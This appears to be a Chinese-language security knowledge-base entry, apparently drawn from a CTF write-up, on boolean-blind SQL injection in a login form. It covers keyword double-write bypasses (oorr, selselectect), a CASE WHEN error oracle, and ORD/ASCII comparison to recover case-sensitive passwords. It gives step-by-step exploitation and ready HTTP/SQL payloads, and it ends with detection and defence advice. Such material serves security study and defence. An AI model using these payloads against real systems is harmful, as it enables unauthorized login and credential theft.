---
id: web-generic-sqli-blind-ascii-case-restore-login
title: 布尔盲注的大小写陷阱：字符比较大小写不敏感，登录校验区分大小写时用 ORD/ASCII 还原
type: scenario
domain: web
path: web/generic/sqli
technique: boolean-blind-case-insensitive-ascii-restore
aliases:
- 盲注大小写陷阱
- 字符盲注爆不出大写
- ORD/ASCII 还原大小写
- 登录框布尔盲注
- oorr/selselectect 双写绕过
- CASE WHEN 盲注
tags:
- web
- sqli
- blind
- boolean
- waf-bypass
- mysql
- login
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V184
  verified_at: '2026-11-06T20:05:28+08:00'
  notes: 已对照原文与全部8张图片核对：CASE WHEN布尔oracle、oorr/selselectect双写、ASCII/ORD大小写还原、heavysql/users/kingdom123ABC与Burp结果一致；未复跑靶场。
---

## 一句话结论

在登录框做布尔盲注时，如果只用 `substr(...,1,1)='a'` 这类字符比较来逐位爆破，会掉进 MySQL 默认排序规则“大小写不敏感”的陷阱：`'A'` 与 `'a'` 都返回真，爆出的密码全是小写，而登录校验区分大小写，导致拿到“看起来正确”的密码却登不进去；改用 `ORD()`/`ASCII()` 比较字符码点（如 `=65` 才是大写 `A`），才能还原真实大小写。关键词被单次替换为空时，用 `oorr`/`selselectect` 双写还原，再用 `CASE WHEN ... ELSE (select 1 union select 2)` 把真假条件映射成“正常/多行子查询错误”的 oracle。

## 原理

- **布尔 oracle**：登录接口在用户名/密码正确时返回正常页面（或 302），失败时返回 `error...`；即使没有回显 SQL 结果，也能用响应长度/状态/文案区分条件真假。
- **双写绕过**：服务端把 `or`、`select` 等关键字替换为空字符串。`oorr` 删除中间的 `or` 后变成 `or`；`selselectect` 删除 `select` 后变成 `select`；同理 `infoorrmation_schema` 变成 `information_schema`。这种替换只做一次，嵌套关键字能存活。
- **CASE WHEN 构造真假差异**：`CASE WHEN (条件) THEN 1 ELSE (select 1 union select 2) END`。条件真时返回 1（单行，登录查询正常）；条件假时走 `ELSE` 的子查询，子查询返回两行会触发 `Subquery returns more than 1 row` 错误，页面表现为失败。这样无需 `IF()`/`SLEEP()`/`AND`/`OR` 也能构造布尔盲注。
- **逐字符枚举**：`substr(database(),1,1)`、`mid((select table_name from information_schema.tables ... limit 0,1),1,1)` 逐个位置取字符；配合 `CASE WHEN` 与 Burp Intruder 的字符集爆破，可爆库名、表名、列名、数据。
- **大小写陷阱**：MySQL 默认 `utf8_general_ci` 等排序规则下，`substr(...)='a'` 对 `'A'` 也为真，所以字符盲注只能区分字母种类，无法区分大小写；而登录时的密码比较可能是二进制/区分大小写（`BINARY`、应用层 `==`），用小写猜出的密码登录会失败。改用 `ord(substr(...,1,1))=65` 或 `ascii(...)` 比较码点，才能还原 `ABC` 等大写字符。
- **注释与闭合**：`username=admin' ... #` 用 `#` 注释掉原查询剩余部分（包括 `' AND password=...`），密码参数随意填；`admin'` 先闭合原字符串。

## 触发条件

- 登录接口把用户名/密码直接拼进 SQL，未使用参数化查询。
- 成功/失败响应存在可观察差异（页面长度、状态码、文案、跳转）。
- 关键字过滤是简单的字符串替换（`or`/`select` → 空），且只替换一次；未做大小写混合、注释、编码或 AST 级检测。
- 数据库为 MySQL/MariaDB（`information_schema`、`CASE WHEN`、`substr`/`mid`、`ord`/`ascii` 可用）；其他数据库需替换对应系统表与函数。

## 利用步骤

1. 用 `admin' or 1=1#` 或 `admin'#` 测试登录，观察成功/失败差异，确认注入点与 oracle。
2. 测试过滤：提交 `or`、`select`，看是否被替换为空；用 `oorr`、`selselectect` 验证双写是否还原。
3. 爆库名：`admin' oorr (case when (substr(database(),1,1)='h') then 1 else (selselectect 1 union selselectect 2) end)#`，逐位爆破。
4. 爆表名/列名：把 `substr` 内换成 `(selselectect table_name from infoorrmation_schema.tables where table_schema=database() limit 0,1)`，逐位枚举 `users`、`id/username/password/...`。
5. 爆数据：对密码等字段用 `oorrd(mid((selselectect passwoorrd from users limit 0,1),1,1))=97` 逐字符比较码点，避免大小写丢失；得到完整密码。
6. 用爆出的账号密码登录，进入后台/下一阶段。

## PoC

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' oorr (case when (substr(database(),1,1)='h') then 1 else (selselectect 1 union selselectect 2) end)#&password=a
```

逐字符爆表名：

```sql
admin' oorr (case when (mid((selselectect table_name from infoorrmation_schema.tables
  where table_schema=database() limit 0,1),1,1)='u') then 1
  else (selselectect 1 union selselectect 2) end)#
```

用码点还原大小写：

```sql
admin' oorr (case when (oorrd(mid((selselectect passwoorrd from users limit 0,1),1,1))=97)
  then 1 else (selselectect 1 union selselectect 2) end)#
```

原文在登录框实测爆出库名 `heavysql`、表 `users`、列 `id/username/password/user/current_connections`、密码 `kingdom123ABC`；本库未复跑。

## 变体与关联

- 变体：过滤 `and` 时用 `oorr` 同理双写 `anand`；过滤 `=` 时用 `like`/`regexp`/`in`；过滤空格时用 `/**/`、`%09`、括号。
- 变体：无 `CASE WHEN` 时用 `if()`、`elt()`、`greatest()`、位运算构造 oracle；时间盲注可用 `benchmark()`/`sleep()`。
- 变体：大小写问题也可用 `BINARY substr(...)='A'`、`hex()`、`ord()` 解决；不同数据库用 `ASCII()`/`UNICODE()`/`CHR()`。
- 关联：[[web-generic-sqli-keyword-double-write-bypass]]（双写还原关键字的通用手法）、[[web-generic-sqli-blind-filter-bypass-functions]]（IF/SLEEP/AND/OR 被过滤时的替代原语，含 CASE WHEN）、[[web-generic-sqli-exists-left-boolean-oracle]]（EXISTS/LEFT 布尔 oracle）、[[web-generic-sqli-login-username-comment-universal-password]]（登录框万能密码）。

## 检测与防御

- **检测**：登录请求中出现 `case when`、`substr`/`mid`、`information_schema`、`union select`、`#`、`oorr`/`selselectect` 等异常模式；同一账号/ IP 高频请求且响应长度呈两簇分布（布尔盲注的典型特征）；登录失败率异常高。
- **防御**：使用参数化查询/预编译语句，禁止拼接 SQL；对输入做类型和长度校验；统一登录成功/失败响应（相同状态码、文案、长度、耗时），避免布尔/时间侧信道；WAF 做大小写不敏感、递归替换和 AST 级检测；对登录接口限速、验证码、锁定。
- **加固**：数据库账号最小权限，禁止访问 `information_schema` 以外的系统库；错误信息不回显给用户；审计日志保留完整 SQL 与参数（脱敏）。
